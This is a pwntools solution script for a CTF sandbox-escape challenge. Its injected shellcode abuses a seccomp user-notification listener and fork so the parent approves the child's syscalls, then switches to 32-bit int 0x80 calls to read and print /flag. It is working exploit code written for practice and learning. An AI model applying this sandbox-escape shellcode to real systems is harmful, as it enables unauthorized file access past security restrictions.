from pwn import *
debug = 0
if debug:
    p = process("./chal4")
else:
    p = remote("how2pwn.chal.csaw.io",60004)
    # p = remote("0.0.0.0",60004)

p.send(b"7a01505a0cfefc2f8249cb24e01a2890")

# This challeneg only allows __NR_seccomp __NR_fork __NR_ioctl __NR_exit
# 1. You can find a similar challenge here: https://n132.github.io/2022/07/04/S2.html. 
# 2. After reading the article, I pretty sure you know the solution.
# 3. Implement it in shellcode
# 4. For debugging, you may need this: https://sourceware.org/gdb/onlinedocs/gdb/Forks.html
# 5. SECCOMP_IOCTL_NOTIF_SEND == 0xC0182101 & SECCOMP_IOCTL_NOTIF_RECV==0xc0502100
# 6. Memory dump while calling     
# syscall(317,SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER ,&exp_prog);
# [-------------------------------------code-------------------------------------]
#    0x55555555545b <main+626>:    mov    esi,0x1
#    0x555555555460 <main+631>:    mov    edi,0x13d
#    0x555555555465 <main+636>:    mov    eax,0x0
# => 0x55555555546a <main+641>:    call   0x5555555550a0 <syscall@plt>
#    0x55555555546f <main+646>:    mov    DWORD PTR [rbp-0x118],eax
#    0x555555555475 <main+652>:    cmp    DWORD PTR [-0x118],0x3
#    0x55555555547c <main+659>:    jne    0x5555555555d1 <main+1000>
#    0x555555555482 <main+665>:    mov    edi,0x39
# Guessed arguments:
# arg[0]: 0x13d
# arg[1]: 0x1
# arg[2]: 0x8
# arg[3]: 0x7fffffffe4e0 --> 0x4
# [------------------------------------stack-------------------------------------]
# 0000| 0x7fffffffe4c0 --> 0x0
# 0008| 0x7fffffffe4c8 --> 0x0
# 0016| 0x7fffffffe4d0 --> 0xa ('\n')
# 0024| 0x7fffffffe4d8 --> 0x7fffffffe530 --> 0x20 (' ')
# 0032| 0x7fffffffe4e0 --> 0x4
# 0040| 0x7fffffffe4e8 --> 0x7fffffffe510 --> 0x400000020
# 0048| 0x7fffffffe4f0 --> 0x0
# 0056| 0x7fffffffe4f8 --> 0x0
# [------------------------------------------------------------------------------]
# Legend: code, data, rodata, value
# 0x000055555555546a in main ()
# gdb-peda$ stack 30
# 0000| 0x7fffffffe4c0 --> 0x0
# 0008| 0x7fffffffe4c8 --> 0x0
# 0016| 0x7fffffffe4d0 --> 0xa ('\n')
# 0024| 0x7fffffffe4d8 --> 0x7fffffffe530 --> 0x20 (' ')
# 0032| 0x7fffffffe4e0 --> 0x4
# 0040| 0x7fffffffe4e8 --> 0x7fffffffe510 --> 0x400000020
# 0048| 0x7fffffffe4f0 --> 0x0
# 0056| 0x7fffffffe4f8 --> 0x0
# 0064| 0x7fffffffe500 --> 0x2
# 0072| 0x7fffffffe508 --> 0x0
# 0080| 0x7fffffffe510 --> 0x400000020
# 0088| 0x7fffffffe518 --> 0xc000003e00010015
# 0096| 0x7fffffffe520 --> 0x7fc0000000000006
# 0104| 0x7fffffffe528 --> 0x7fff000000000006
# 0112| 0x7fffffffe530 --> 0x20 (' ')
# 0120| 0x7fffffffe538 --> 0x13d01000015
# 0128| 0x7fffffffe540 --> 0x7fff000000000006
# 0136| 0x7fffffffe548 --> 0x3901000015
# 0144| 0x7fffffffe550 --> 0x7fff000000000006
# 0152| 0x7fffffffe558 --> 0x1001000015
# 0160| 0x7fffffffe560 --> 0x7fff000000000006
# 0168| 0x7fffffffe568 --> 0x3c01000015
# 0176| 0x7fffffffe570 --> 0x7fff000000000006
# 0184| 0x7fffffffe578 --> 0x7ff0000000000006
# 0192| 0x7fffffffe580 --> 0x0
# END

"""
    mov rbx, 0
    push rbx
    mov rbx, 2
    push rbx
    mov rbx, 0
    push rbx
    push rbx
"""
context.arch = 'amd64'
shellcode = f'''
    mov esp,0xcafe800
    mov rsi,0x8
    mov rbx,0x7fff000000000006
    push rbx
    mov rbx, 0x7fc0000000000006
    push rbx
    mov rbx, 0xc000003e00010015
    push rbx
    mov rbx, 0x400000020
    push rbx

    mov rbx,rsp
    push rbx
    xor rbx,rbx
    mov bl,0x4
    push rbx
    mov rdx,rsp
    mov rax, 0x13d
    mov rdi,1
    syscall

    mov r8,rax
    mov rax, 0x39
    syscall

    cmp rax, 0

    je child_process
parent_process:
    xor rax,rax
clean_req_and_resp:
    mov ecx, 0x68
    mov rdx, 0xcafec00
loop:
    mov qword ptr [rdx],rax
    dec rcx
    add dl,0x8
    cmp rcx,0
    jne loop
recv:
    mov rax,16
    mov rdi,r8
    mov rsi,0xc0502100
    mov rdx,0xcafec00
    syscall

copy_id_of_resp:
    mov rax, 0xcafec00
    mov rbx, qword ptr[rax]
    add al,0x50
    mov qword ptr[rax], rbx
set_flags_of_resp:
    add al,0x14
    mov rbx,1
    mov dword ptr[rax], ebx
resp:
    xor rax,rax
    mov al,  16
    mov rdi, r8
    mov esi, 0xC0182101
    mov edx, 0xcafec50
    syscall
    jmp parent_process

child_process:
    mov rcx,0x10000
wait_loop:
    dec rcx
    cmp rcx,0
    jne wait_loop
show_flag:
    mov rax,0xcafe180
    push rax
    ret
'''

# 0xcafe1f0 : flag
X32_showflag ='''
    mov eax, 0x5
    mov ebx, 0xcafe1f0
    xor ecx, ecx
    xor edx, edx
    int 0x80

    mov ebx,eax
    mov eax,0x3
    mov ecx,0xcafe000+0x200
    mov edx,0x100
    int 0x80

    mov ebx, 1
    mov ecx,0xcafe1f0
    mov edx,0x100
    mov eax, 4
    int 0x80
'''

shellcode = asm(shellcode)+b'\xcb'
context.arch = 'i386'
context.bits = 32
shellcode = shellcode.ljust(0x180,b'\0') + asm(X32_showflag)
context.log_level='debug'
# gdb.attach(p)
pause()
p.sendafter(": \n",(shellcode).ljust(0x1f0,b'\0')+b"/flag\0")
p.interactive()

